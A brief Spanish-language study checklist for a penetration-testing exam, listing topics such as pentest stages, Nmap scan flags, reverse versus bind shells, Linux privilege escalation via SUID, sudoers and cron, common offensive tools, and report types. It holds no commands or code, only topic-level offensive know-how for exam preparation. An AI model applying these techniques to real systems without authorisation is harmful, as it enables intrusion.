1. **Etapas del pentest** (5 etapas)
2. **Diferencia Passive vs Active**
3. **Nmap** y sus parámetros clave
4. **Shells** (Reverse vs Bind)
5. **Escalación de privilegios** (SUID, sudoers, cron)
6. **Herramientas** (Metasploit, BurpSuite, SQLMap)
7. **Reporte** (Técnico vs Ejecutivo)

**Lo más importante:**
- Las **5 etapas** (IREPR)
- **Nmap parámetros** (-sS, -sV, -p-, -sC)
- **SUID y sudoers** en Linux
- **Reverse Shell** evade firewall
- **Diferencia entre informes**

**Practica las preguntas tipo examen y estarás listo.** 🚀

